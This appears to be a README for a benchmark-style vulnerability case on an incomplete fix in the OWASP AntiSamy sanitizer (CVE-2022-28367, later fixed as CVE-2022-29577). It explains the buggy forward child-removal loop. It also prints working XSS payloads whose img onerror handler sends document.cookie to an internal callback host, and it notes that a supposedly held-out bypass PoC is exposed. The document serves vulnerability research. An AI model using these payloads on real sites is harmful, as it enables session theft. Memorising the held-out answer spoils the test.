# antisamy_style_smuggling

OWASP AntiSamy — CVE-2022-28367 → CVE-2022-29577 (STYLE-tag HTML smuggling past a buggy forward
child-removal loop, CWE-79).
**Genuine incomplete fix; gate passed on real Docker with a headless-Chromium victim proving JS
EXECUTION (cookie exfil to the internal callback — see `repro.log`).**

V1 不完整修复的源码级分析见同目录 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

REAL OWASP AntiSamy sanitizer (maven `org.owasp.antisamy:antisamy`, pinned per profile via build-arg
`ANTISAMY_VER`, stock `antisamy.xml` policy that allows `<style>`), served by a JDK
`com.sun.net.httpserver` sink: `GET /?html=<payload>` runs
`new AntiSamy().scan(html, antisamy.xml, AntiSamy.DOM).getCleanHTML()` and renders the result. A
selenium `browser` grid + headless-Chromium `victim` carrying the `${PCB_FLAG}` as its `session`
cookie for the app origin VIEWS that page; the smuggled `<img onerror>` reads `document.cookie` and
navigates to the internal `callback:9000` collector — so the flag proves browser-side execution, not
reflection. The ONLY difference across v0/v1/v2 is the pinned AntiSamy version.

- **V0 = AntiSamy 1.6.5** (`:34720`) — `AntiSamyDOMScanner.processStyleTag()` scans only
  `firstChild` as CSS and leaves smuggled child nodes RAW in the output → seed's `</style>` breakout +
  live `<img onerror>` survive → executes → flag. Seed and residual both open.
- **V1 = AntiSamy 1.6.6** (`:34721`, target; CVE-2022-28367 partial fix commit `0199e7e1`) —
  `processStyleTag()` now concatenates all child text for the CSS scan and adds a child-removal loop —
  but it iterates FORWARD over a LIVE NodeList (`for (int i = 1; i < ele.getChildNodes().getLength();
  i++) ele.removeChild(ele.getChildNodes().item(i))`), so removing `item(1)` shifts item(2)→item(1)
  while `i` advances and the length shrinks: every other smuggled child is SKIPPED. The single-node
  seed is removed → BLOCKED; the even-index smuggled node of the residual survives → executes → flag.
  Incomplete fix.
- **V2 = AntiSamy 1.6.7** (`:34722`, CVE-2022-29577 fix) — the loop SNAPSHOTs `childNodesCount` and
  iterates in REVERSE (`for (int i = childNodesCount - 1; i >= 1; i--) ... removeChild(...)`),
  removing ALL smuggled children → residual BLOCKED (regression test `testSmuggledTagsInStyleContent`
  added with the fix).

- **Original trigger**: payload `<style/>b<![cdata[</style><img src=x onerror="document.location=
  '//callback:9000/c?f='+document.cookie">` on `/?html=` — ONE smuggled `<style>` child node; the
  `<![cdata[` bogus-comment keeps the `</style>` breakout + `onerror` as RAW TEXT (parsed as an
  element instead, neko would drop `onerror`).
- **Residual trigger**: the seed plus a single throwaway `<b></b>` inserted before the breakout —
  `<style/>a<b></b><![cdata[</style><img ...>` — TWO smuggled children, pushing the dangerous node to
  an EVEN child index, exactly the index the 1.6.6 forward removal loop skips. Only that delta.

Run: `python3 oracle.py --gate` (or `--wait`; `--probe original|bypass`; needs `PCB_FLAG`). See `repro.log` and `case.json`.

> NOTE: `_heldout/bypass_poc.py` is claimed as held out in `case.json` (`held_out`), but an identical
> copy exists at `poc/bypass_poc.py` (`diff` reports the two files SAME).

> NOTE: `case.json` leaves `versions.v0.base_url` and `versions.v2.base_url` null while only v1 has a
> `base_url`; `docker-compose.yml` and `repro.log` do publish all three app ports (v0=34720, v1=34721,
> v2=34722). Cosmetic, but the case.json fields understate the recipe.
